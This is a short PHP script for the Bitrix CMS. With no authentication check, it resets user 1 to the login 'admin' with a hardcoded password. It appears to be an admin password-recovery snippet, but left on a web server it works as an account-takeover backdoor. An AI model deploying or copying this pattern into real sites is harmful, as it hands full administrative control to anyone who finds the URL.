<?
require($_SERVER['DOCUMENT_ROOT']."/bitrix/header.php");
echo $USER->Update(1,array("LOGIN"=>'admin', "PASSWORD"=>'12Sh10s#62gtDSH71*!KJf82S&Hh'));
echo $USER->LAST_ERROR;
require($_SERVER['DOCUMENT_ROOT']."/bitrix/footer.php");
?>